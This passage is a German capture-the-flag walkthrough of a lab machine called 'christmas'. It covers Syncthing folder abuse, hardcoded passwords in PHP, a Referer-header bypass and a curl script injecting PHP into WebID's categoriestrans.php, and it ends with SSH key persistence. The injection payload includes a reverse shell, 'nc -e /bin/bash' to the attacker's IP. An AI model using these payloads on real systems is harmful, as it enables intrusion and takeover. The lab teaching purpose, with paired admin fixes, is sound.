+             <p class="analysis"><strong>Analyse:</strong> Über die Weboberfläche der Ziel-Syncthing-Instanz (`http://192.168.3.1:8384`) wird das Angreifer-Gerät hinzugefügt (unter Verwendung der lokalen Kennung `ND2CVK...`, die als "kali" benannt wird). Anschließend wird auf der Ziel-Instanz ein neuer Ordner mit dem Pfad `/srv/ftp` erstellt und dieser für das Gerät "kali" freigegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist die Ausnutzung der ungeschützten Syncthing-Instanz. Durch das Hinzufügen des Angreifer-Geräts und das Freigeben des Ordners `/srv/ftp` werden die Inhalte dieses Ordners vom Zielsystem zum Angreifer-System synchronisiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Akzeptieren Sie die Gerätekopplung und die Ordnerfreigabe auf Ihrer lokalen Syncthing-Instanz (`http://localhost:8384`). Warten Sie, bis die Synchronisation abgeschlossen ist. Untersuchen Sie die synchronisierten Dateien aus `/srv/ftp` auf dem Angreifer-System auf sensible Informationen oder weitere Hinweise.
+             <br><strong>Empfehlung (Admin):</strong> Sichern Sie die Syncthing-Oberfläche (siehe vorherige Empfehlung). Überprüfen Sie die konfigurierten Freigaben und Berechtigungen in Syncthing.</p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">
+# Schritte in der Ziel-Syncthing-GUI (http://192.168.3.1:8384/):
+
+1.  Klick auf "[+] Gerät hinzufügen"
+2.  Gerätekennung eingeben: ND2CVK6-QDSW4U4-2ZUH2-YJ37IW4-5JAXEFM-DLKTDEG-2D5QIZJ-ZXIIDAW
+3.  Gerätename eingeben: kali
+4.  Speichern
+
+5.  Klick auf "[+] Ordner hinzufügen"
+6.  Pfad eingeben: /srv/ftp
+7.  Tab "Teilen" auswählen
+8.  Checkbox bei "kali" aktivieren
+9.  Speichern
+
+# Schritte in der lokalen Syncthing-GUI (http://localhost:8384/):
+
+10. Aufforderung zur Gerätekopplung mit "christmas" akzeptieren.
+11. Aufforderung zur Ordnerfreigabe "/srv/ftp" akzeptieren (Lokalen Pfad wählen, z.B. /home/cyber/ftp).
+</span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Nachdem die Dateien aus `/srv/ftp` synchronisiert wurden (der Ordner `dy3ij-gqpcz` ist der automatisch generierte Ordnername von Syncthing für die Freigabe), wird der Inhalt auf dem Angreifer-System untersucht. Eine Datei `backup.zip` wird gefunden und entpackt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das ZIP-Archiv enthält offenbar ein Backup der ursprünglichen Webseite (`index.php`, `login.php`, `assets/`, `images/`, etc.). Dies ist ein wertvoller Fund, da er den Quellcode der Anwendung offenlegt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Quellcode der entpackten PHP-Dateien, insbesondere `login.php` und andere Dateien, die Benutzereingaben verarbeiten oder Authentifizierung durchführen, auf Schwachstellen oder hartkodierte Zugangsdaten.
+             <br><strong>Empfehlung (Admin):</strong> Speichern Sie keine Backups mit potenziell sensiblem Quellcode in öffentlich zugänglichen oder leicht kompromittierbaren Bereichen wie einem ungesicherten FTP-Verzeichnis, das über Syncthing freigegeben wird.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/dy3ij-gqpcz]
+└─# <span class="command">ll</span></div>
+                     <pre>
+insgesamt 9712
+-rw-r--r-- 1 cyber cyber 9941249 25. Dez 00:00 <span class="command">backup.zip</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/dy3ij-gqpcz]
+└─# <span class="command">unzip backup.zip</span></div>
+                     <pre>
+Archive:  backup.zip
+   creating: assets/
+   creating: assets/css/
+  inflating: assets/css/fontawesome-all.min.css
+  inflating: assets/css/main.css
+  inflating: assets/css/noscript.css
+   creating: assets/js/
+  inflating: assets/js/breakpoints.min.js
+  inflating: assets/js/browser.min.js
+  inflating: assets/js/jquery.min.js
+  inflating: assets/js/main.js
+  inflating: assets/js/util.js
+   creating: assets/sass/
+   creating: assets/sass/base/
+  inflating: assets/sass/base/_page.scss
+  inflating: assets/sass/base/_reset.scss
+  inflating: assets/sass/base/_typography.scss
+   creating: assets/sass/components/
+  inflating: assets/sass/components/_actions.scss
+  inflating: assets/sass/components/_blurb.scss
+  inflating: assets/sass/components/_box.scss
+  inflating: assets/sass/components/_button.scss
+  inflating: assets/sass/components/_form.scss
+  inflating: assets/sass/components/_icon.scss
+  inflating: assets/sass/components/_icons.scss
+  inflating: assets/sass/components/_image.scss
+  inflating: assets/sass/components/_list.scss
+  inflating: assets/sass/components/_mini-posts.scss
+  inflating: assets/sass/components/_posts.scss
+  inflating: assets/sass/components/_row.scss
+  inflating: assets/sass/components/_section.scss
+  inflating: assets/sass/components/_table.scss
+   creating: assets/sass/layout/
+  inflating: assets/sass/layout/_footer.scss
+  inflating: assets/sass/layout/_header.scss
+  inflating: assets/sass/layout/_intro.scss
+  inflating: assets/sass/layout/_main.scss
+  inflating: assets/sass/layout/_menu.scss
+  inflating: assets/sass/layout/_sidebar.scss
+  inflating: assets/sass/layout/_wrapper.scss
+  inflating: assets/sass/libs/_breakpoints.scss
+  inflating: assets/sass/libs/_functions.scss
+  inflating: assets/sass/libs/_mixins.scss
+  inflating: assets/sass/libs/_vars.scss
+  inflating: assets/sass/libs/_vendor.scss
+  inflating: assets/sass/main.scss
+  inflating: assets/sass/noscript.scss
+   creating: assets/webfonts/
+  inflating: assets/webfonts/fa-brands-400.eot
+  inflating: assets/webfonts/fa-brands-400.svg
+  inflating: assets/webfonts/fa-brands-400.ttf
+  inflating: assets/webfonts/fa-brands-400.woff
+  inflating: assets/webfonts/fa-brands-400.woff2
+  inflating: assets/webfonts/fa-regular-400.eot
+  inflating: assets/webfonts/fa-regular-400.svg
+  inflating: assets/webfonts/fa-regular-400.ttf
+  inflating: assets/webfonts/fa-regular-400.woff
+  inflating: assets/webfonts/fa-regular-400.woff2
+  inflating: assets/webfonts/fa-solid-900.eot
+  inflating: assets/webfonts/fa-solid-900.svg
+  inflating: assets/webfonts/fa-solid-900.ttf
+  inflating: assets/webfonts/fa-solid-900.woff
+  inflating: assets/webfonts/fa-solid-900.woff2
+  inflating: elements.php
+  inflating: generic.php
+   creating: images/
+  inflating: images/bg.jpg
+  inflating: images/pic01.jpg
+  inflating: images/pic02.jpg
+  inflating: images/pic03.jpg
+  inflating: images/pic04.jpg
+  inflating: images/pic05.jpg
+  inflating: images/pic06.jpg
+  inflating: images/pic07.jpg
+  inflating: images/pic08.jpg
+  inflating: images/pic09.jpg
+  inflating: images/pic10.jpg
+  inflating: index.php
+  inflating: login.php
+  inflating: robots.txt</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Quellcode der entpackten Datei `login.php` wird untersucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Im Code werden hartkodierte Zugangsdaten gefunden:
+             <ul><li>Benutzername: `<span class="command">admin</span>`</li><li>Passwort: `<span class="password">MyPassword1@2023*</span>`</li></ul>
+             Diese Zugangsdaten werden verwendet, um Benutzereingaben (`$POST['username']`, `$POST['password']`) zu validieren. Dies ist ein weiterer kritischer Fund.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit diesen Zugangsdaten (`admin`:`MyPassword1@2023*`) auf der Webseite (`http://christmas.hmv/login.php`) oder per SSH oder PPTP anzumelden.
+             <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter hartkodiert im Quellcode. Verwenden Sie sichere Methoden zur Passwortspeicherung (Hashing mit Salt) und Abfrage aus einer Datenbank oder einem Konfigurationsspeicher.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/dy3ij-gqpcz]
+└─# <span class="command">cat login.php</span></div>
+                    <pre>
+ 
+ 
+
+$usernameValid = "<span class="command">admin</span>";
+$passwordValid = "<span class="password">MyPassword1@2023*</span>";
+
+if (isset($POST['username']) && isset($POST['password'])) {
+    $username = $POST['username'];
+    $password = $POST['password'];
+
+    if ($username === $usernameValid && $password === $passwordValid) {
+        $_SESSION['loggedin'] = true;
+        header('Location: 2fa.php');
+....
+...
+..
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird beschrieben, wie man sich bei der `webid`-Anwendung anmeldet. Nach erfolgreichem Login mit `admin`:`MyPassword1@2023*` wird man zu `2fa.php` weitergeleitet. Um auf den eigentlichen Admin-Bereich (`/webid/admin/login.php`) zuzugreifen, muss der `Referer`-HTTP-Header auf `http://christmas.hmv/2fa.php` gesetzt werden (z.B. mit dem Browser-Plugin `ModHeader`). In diesem vermeintlichen Admin-Login wird dann ein anderes Passwort benötigt: `<span class="password">MyPassword2@2023*</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies beschreibt eine fehlerhafte oder ungewöhnliche Authentifizierungs-/Autorisierungslogik. Die Notwendigkeit, den Referer zu manipulieren, um auf einen versteckten Admin-Bereich zuzugreifen, ist eine Schwachstelle (Security through Obscurity ist keine echte Sicherheit). Das Vorhandensein eines zweiten, unterschiedlichen Passworts (`MyPassword2@2023*`) deutet auf weitere hartkodierte Zugangsdaten oder eine separate Authentifizierung hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Installieren Sie das ModHeader-Plugin oder verwenden Sie Burp Suite/OWASP ZAP, um den Referer-Header zu manipulieren.</li><li>Versuchen Sie, sich unter `http://christmas.hmv/webid/admin/login.php` (mit gesetztem Referer) mit `admin`:`MyPassword2@2023*` anzumelden.</li><li>Wenn erfolgreich, untersuchen Sie den Admin-Bereich auf Schwachstellen wie Datei-Upload, Codeausführung oder Informationslecks.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Implementieren Sie eine korrekte, robuste Authentifizierung und Autorisierung. Verlassen Sie sich nicht auf den Referer-Header zur Zugriffskontrolle, da dieser leicht manipuliert werden kann.</li><li>Entfernen Sie hartkodierte Passwörter (`MyPassword1@2023*`, `MyPassword2@2023*`).</li><li>Überprüfen Sie die Logik der 2FA-Implementierung oder des Admin-Bereichs-Zugriffs.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="comment">
+# Login-Prozess Beschreibung:
+1. Login auf http://christmas.hmv/login.php mit "admin":"MyPassword1@2023*" -> Weiterleitung zu 2fa.php
+2. ModHeader Plugin verwenden: Referer setzen auf "http://christmas.hmv/2fa.php"
+3. Zu http://christmas.hmv/webid/admin/login.php navigieren.
+4. Login mit Username="admin", Password="MyPassword2@2023*"
+</span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein `curl`-Befehl wird vorbereitet (gespeichert in `webid_Crack`), um eine Schwachstelle in `categoriestrans.php` auszunutzen. Der Befehl sendet einen POST-Request mit manipulierten Daten (`categories[123);system(\"whoami>out\");/*]=test`). Der `Referer`-Header und Cookies (`UserAuthenticated=true`) werden gesetzt, um die vorherige Authentifizierung zu simulieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klarer Versuch der Command Injection. Der Payload `system(\"whoami>out\")` wird in den `categories`-Parameter eingeschleust, indem die schließende Klammer `)` und ein Kommentar `/*` verwendet werden, um den restlichen Teil des erwarteten Parameters auszukommentieren. Wenn der Code auf dem Server diesen Parameter unsicher verarbeitet (z.B. in einem `eval()` oder einer ähnlichen Funktion), wird der `whoami`-Befehl ausgeführt und seine Ausgabe in die Datei `out` im aktuellen Verzeichnis (`/webid/admin/`) geschrieben.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie das `webid_Crack`-Skript aus. Rufen Sie anschließend die URL `http://christmas.hmv/webid/admin/out` auf, um zu überprüfen, ob die Datei erstellt wurde und die Ausgabe von `whoami` (wahrscheinlich `www-data`) enthält.
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die Command Injection-Schwachstelle in `categoriestrans.php`. Validieren und bereinigen Sie alle Benutzereingaben rigoros, insbesondere wenn sie in Systembefehlen oder dynamischen Code-Auswertungsfunktionen verwendet werden. Verwenden Sie keine unsicheren Funktionen wie `eval()`. Überprüfen Sie die Authentifizierungs- und Autorisierungslogik erneut.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/dy3ij-gqpcz]
+└─# <span class="command">nano webid_Crack</span></div>
+                     <pre>
+<span class="comment">#!/bin/bash</span>
+curl -i -s -k -X $'POST' \
+-H $'Host: christmas.hmv' \
+-H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' \
+-H $'Referer: http://christmas.hmv/2fa.php' \
+-H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
+-H $'Accept-Encoding: gzip, deflate' \
+-H $'Connection: close' \
+-H $'Cookie: PHPSESSID=0ooe7mel4rmd11438aem1567u5;UserAuthenticated=true' \
+-H $'Upgrade-Insecure-Requests: 1' \
+-H $'Sec-Fetch-Dest: document' \
+-H $'Sec-Fetch-Mode: navigate' \
+-H $'Sec-Fetch-Site: none' \
+-H $'Sec-Fetch-User: ?1' \
+-H $'Content-Type: application/x-www-form-urlencoded' \
+    -b $'PHPSESSID=0ooe7mel4rmd11438aem1567u5;UserAuthenticated=true' \
+    --data-binary $'categories[123);<span class="password">system(\"whoami>out\")</span>;/*]=test' \
+    $'http://christmas.hmv/webid/admin/categoriestrans.php?lang=..'
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/dy3ij-gqpcz]
+└─# <span class="command">bash webid_Crack</span></div>
+                     <pre>
+HTTP/1.1 200 OK
+Date: Fri, 29 Dec 2023 14:50:00 GMT
+Server: Apache/2.4.57 (Debian)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 5271
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<span class="comment">[HTML-Antwort der Seite]</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">
+# Überprüfung im Browser oder mit curl:
+# curl http://christmas.hmv/webid/admin/out
+</span></pre>
+                     <pre><span class="password">www-data</span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Nachdem die Codeausführung als `www-data` bestätigt wurde, wird ein Netcat-Listener auf Port 4444 gestartet. Das `webid_Crack`-Skript wird angepasst, um statt `whoami` einen Reverse-Shell-Befehl (`nc -e /bin/bash 192.168.2.199 4444`) über die Command Injection auszuführen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der logische nächste Schritt nach der Bestätigung der RCE. Das Ziel ist es, eine interaktive Shell als `www-data` auf dem Angreifer-System zu erhalten. Die IP `192.168.2.199` ist die des Angreifers.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie den Listener, führen Sie das modifizierte `webid_Crack`-Skript aus und warten Sie auf die eingehende Verbindung auf Port 4444. Stabilisieren Sie die Shell bei Bedarf.
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die Command Injection-Schwachstelle dringend (siehe vorherige Empfehlung).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>listening on [any] 4444 ...</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/dy3ij-gqpcz]
+└─# <span class="command">nano webid_Crack</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/dy3ij-gqpcz]
+└─# <span class="command">cat webid_Crack</span></div>
+                     <pre>
+<span class="comment">#!/bin/bash</span>
+curl -i -s -k -X $'POST' \
+-H $'Host: christmas.hmv' \
+-H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' \
+-H $'Referer: http://christmas.hmv/2fa.php' \
+-H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
+-H $'Accept-Encoding: gzip, deflate' \
+-H $'Connection: close' \
+-H $'Cookie: PHPSESSID=0ooe7mel4rmd11438aem1567u5;UserAuthenticated=true' \
+-H $'Upgrade-Insecure-Requests: 1' \
+-H $'Sec-Fetch-Dest: document' \
+-H $'Sec-Fetch-Mode: navigate' \
+-H $'Sec-Fetch-Site: none' \
+-H $'Sec-Fetch-User: ?1' \
+-H $'Content-Type: application/x-www-form-urlencoded' \
+    -b $'PHPSESSID=0ooe7mel4rmd11438aem1567u5;UserAuthenticated=true' \
+    --data-binary $'categories[123);<span class="password">system(\"nc -e /bin/bash 192.168.2.199 4444\")</span>;/*]=test' \
+    $'http://christmas.hmv/webid/admin/categoriestrans.php?lang=..'
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/dy3ij-gqpcz]
+└─# <span class="command">bash webid_Crack</span></div>
+                     <pre><span class="comment">[Anfrage wird gesendet...]</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.106] 55062</span>
+<span class="prompt">www-data@christmas:/var/www/html/webid/admin$ </span></pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Die erhaltene `www-data`-Shell wird stabilisiert (`script /dev/null -c bash`). Anschließend werden die Home-Verzeichnisse aufgelistet und das Home-Verzeichnis von `mr-jack` betreten und untersucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein Benutzer `mr-jack` existiert. Das Home-Verzeichnis enthält Standard-Konfigurationsdateien, `.oh-my-zsh`-Dateien und eine `user.txt`. Ein `.ssh`-Verzeichnis existiert ebenfalls. Die `user.txt` ist für `www-data` nicht lesbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Konfigurationsdateien und versteckten Verzeichnisse im Home-Verzeichnis von `mr-jack` auf Hinweise oder Zugangsdaten. Das Verzeichnis `.config` ist ein guter Startpunkt.
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Webserver-Benutzer keine Home-Verzeichnisse anderer Benutzer lesen können. Überprüfen Sie Konfigurationsdateien auf versehentlich gespeicherte sensible Daten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.106] 55062</pre>
+                     <span class="command">script /dev/null -c bash</span>
+                     <pre>Script started, output log file is '/dev/null'.</pre>
+                     <div class="prompt">www-data@christmas:/var/www/html/webid/admin$ <span class="command">cd /home</span></div>
+                     <div class="prompt">www-data@christmas:/home$ <span class="command">ls</span></div>
+                     <pre>mr-jack</pre>
+                     <div class="prompt">www-data@christmas:/home$ <span class="command">cd mr-jack</span></div>
+                     <div class="prompt">www-data@christmas:/home/mr-jack$ <span class="command">ls -la</span></div>
+                     <pre>
+total 388
+drwxr-xr-x  6 mr-jack mr-jack   4096 Nov 18 12:58 .
+drwxr-xr-x  3 root    root      4096 Nov 13 16:55 ..
+lrwxrwxrwx  1 root    root         9 Nov 18 12:58 .bash_history -> /dev/null
+-rw-r--r--  1 mr-jack mr-jack    220 Dec 25 00:00 .bash_logout
+-rw-r--r--  1 mr-jack mr-jack   3526 Dec 25 00:00 .bashrc
+drwxr-xr-x  4 mr-jack mr-jack   4096 Dec 25 00:00 <span class="command">.config</span>
+drwxr-xr-x  3 mr-jack mr-jack   4096 Dec 25 00:00 .local
+drwxr-xr-x 12 mr-jack mr-jack   4096 Dec 25 00:00 .oh-my-zsh
+-rw-r--r--  1 mr-jack mr-jack    807 Dec 25 00:00 .profile
+drwx------  2 mr-jack mr-jack   4096 Nov 18 10:44 <span class="command">.ssh</span>
+-rw-r--r--  1 mr-jack mr-jack  51816 Nov 17 18:22 .zcompdump-christmas-5.9
+-r--r--r--  1 mr-jack mr-jack 119928 Nov 17 18:22 .zcompdump-christmas-5.9.zwc
+-rw-r--r--  1 mr-jack mr-jack  51816 Dec 25 00:00 .zcompdump-debian-5.9
+-r--r--r--  1 mr-jack mr-jack 119920 Dec 25 00:00 .zcompdump-debian-5.9.zwc
+-rw-r--r--  1 mr-jack mr-jack   3890 Dec 25 00:00 .zshrc
+-rwxr-xr-x  1 mr-jack mr-jack     33 Dec 25 00:00 <span class="command">user.txt</span></pre>
+                     <div class="prompt">www-data@christmas:/home/mr-jack$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">cat: user.txt: Permission denied</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Verzeichnis `/home/mr-jack/.config` wird betreten und aufgelistet. Darin befindet sich ein Verzeichnis `.SecureGateway` und ein `syncthing`-Verzeichnis. Das `.SecureGateway`-Verzeichnis wird untersucht, es enthält eine Datei `firewall_config.conf`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `firewall_config.conf` enthält Konfigurationsdetails einer fiktiven Firewall. Entscheidend ist der Eintrag: `<span class="command">AdminPortalURL = "https://mr-jack:<span class="password">m3rrychr157m4523</span>@192.168.100.1:8080/login"</span>`. Dies enthüllt das Passwort (`m3rrychr157m4523`) für den Benutzer `mr-jack`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den Benutzernamen `mr-jack` und das Passwort `m3rrychr157m4523`, um sich per SSH oder `su` als dieser Benutzer anzumelden.
+            <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Klartext-Passwörter in Konfigurationsdateien, selbst wenn diese im Home-Verzeichnis liegen. Verwenden Sie sicherere Methoden zur Speicherung von Zugangsdaten. Überprüfen Sie die Dateiberechtigungen für Konfigurationsdateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@christmas:/home/mr-jack$ <span class="command">cd .config</span></div>
+                    <div class="prompt">www-data@christmas:/home/mr-jack/.config$ <span class="command">ls -la</span></div>
+                    <pre>
+total 16
+drwxr-xr-x  4 mr-jack mr-jack 4096 Dec 25 00:00 .
+drwxr-xr-x  6 mr-jack mr-jack 4096 Nov 18 12:58 ..
+dr-xr-xr-x+ 2 mr-jack mr-jack 4096 Dec 25 00:00 <span class="command">.SecureGateway</span>
+drwxr-xr-x  3 mr-jack mr-jack 4096 Dec 29 14:55 syncthing</pre>
+                    <div class="prompt">www-data@christmas:/home/mr-jack/.config$ <span class="command">cd  .SecureGateway</span></div>
+                    <div class="prompt">www-data@christmas:/home/mr-jack/.config/.SecureGateway$ <span class="command">ls -la</span></div>
+                    <pre>
+total 12
+dr-xr-xr-x+ 2 mr-jack mr-jack 4096 Dec 25 00:00 .
+drwxr-xr-x  4 mr-jack mr-jack 4096 Dec 25 00:00 ..
+-rwxr-xr-x  1 mr-jack mr-jack 1073 Dec 25 00:00 <span class="command">firewall_config.conf</span></pre>
+                    <div class="prompt">www-data@christmas:/home/mr-jack/.config/.SecureGateway$ <span class="command">cat firewall_config.conf</span></div>
+                    <pre>
+# Example Firewall Configuration File - firewall_config.conf
+[...]
+<span class="command">AdminPortalURL = "https://<span class="command">mr-jack</span>:<span class="password">m3rrychr157m4523</span>@192.168.100.1:8080/login"</span>
+[...]
+# End of Configuration File</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `su mr-jack` wird ausgeführt und das gefundene Passwort (`m3rrychr157m4523`) eingegeben. Nach erfolgreichem Wechsel wird die User-Flag gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Wechsel zum Benutzer `mr-jack` gelingt. Als `mr-jack` kann nun die Datei `user.txt` gelesen werden. Die User-Flag lautet: `<span class="password">caf45c355c29186bb9d8ab89f7811bf0</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die User-Flag. Führen Sie als `mr-jack` `sudo -l` aus, um die Berechtigungen für die nächste Stufe der Rechteausweitung zu prüfen.
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter. Vermeiden Sie das Speichern von Passwörtern im Klartext.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@christmas:/home/mr-jack/.config/.SecureGateway$ <span class="command">su mr-jack</span></div>
+                    <pre>Password: <span class="comment">(Passwort 'm3rrychr157m4523' eingegeben)</span></pre>
+                    <div class="prompt"><span class="comment">[oh-my-zsh update prompt - irrelevant]</span></div>
+                    <div class="prompt">╭─mr-jack@christmas ~/.config/.SecureGateway
+╰─$ <span class="command">cd ~</span></div>
+                    <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">caf45c355c29186bb9d8ab89f7811bf0</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `mr-jack` werden die `sudo`-Berechtigungen überprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `mr-jack` darf den Befehl `/opt/GiftPursuit` als jeder Benutzer (`ALL : ALL`) ohne Passwort (`NPASSWD`) ausführen. Dies ist der nächste Vektor für die Rechteausweitung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie das Skript `/opt/GiftPursuit` (`cat /opt/GiftPursuit`), um dessen Funktionsweise zu verstehen und eine Möglichkeit zur Ausnutzung für Root-Zugriff zu finden.
+             <br><strong>Empfehlung (Admin):</strong> Vergeben Sie `sudo`-Rechte restriktiv. Überprüfen Sie benutzerdefinierte Skripte, die mit `sudo` ausgeführt werden dürfen, sorgfältig auf Sicherheitsschwachstellen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for mr-jack on christmas:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User mr-jack may run the following commands on christmas:
+    <span class="password">(ALL : ALL) NOPASSWD: /opt/GiftPursuit</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein SSH-Schlüsselpaar wird für `mr-jack` generiert. Der private Schlüssel wird angezeigt, und der öffentliche Schlüssel wird in die `authorized_keys`-Datei kopiert. Anschließend wird vom Angreifer-System versucht, sich mit diesem Schlüssel anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies sind Schritte, um persistenten SSH-Zugriff als `mr-jack` einzurichten, falls die aktuelle Shell verloren geht. Der private Schlüssel im Text ist jedoch passwortgeschützt (erkennbar an `-----BEGIN OPENSSH PRIVATE KEY-----` gefolgt von Verschlüsselungsinformationen wie `aes256-ctr` und `bcrypt` im zweiten `cat`-Beispiel, und der Passwortabfrage beim SSH-Login). Der erste angezeigte Schlüssel scheint unverschlüsselt zu sein, der zweite ist verschlüsselt. Der Login-Versuch erfordert die Passphrase.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn ein unverschlüsselter Schlüssel generiert wurde, kann dieser für den direkten Login verwendet werden. Wenn eine Passphrase gesetzt wurde (wie es beim Login-Versuch aussieht), wird diese benötigt. Da der Fokus auf der Privilege Escalation liegt, ist dieser Schritt optional, aber nützlich für die Persistenz. Konzentrieren Sie sich auf die Analyse von `/opt/GiftPursuit`.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Erstellung und Änderung von SSH-Schlüsseln und `authorized_keys`-Dateien.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">ssh-keygen</span></div>
+                     <pre>
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/mr-jack/.ssh/id_rsa): <span class="comment">(Enter)</span>
+Enter passphrase (empty for no passphrase): <span class="comment">(Enter)</span>
+Enter same passphrase again: <span class="comment">(Enter)</span>
+Your identification has been saved in /home/mr-jack/.ssh/id_rsa
+Your public key has been saved in /home/mr-jack/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:cYaQCWyKTYAlRvCuVLHy9IfoJHMuX/hsya187BAvo mr-jack@christmas.hmv
+The key's randomart image is:
+[...]</pre>
+                     <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">cat .ssh/id_rsa</span></div>
+                     <pre><span class="password">
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+[...]
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                     <div class="prompt">╭─mr-jack@christmas ~
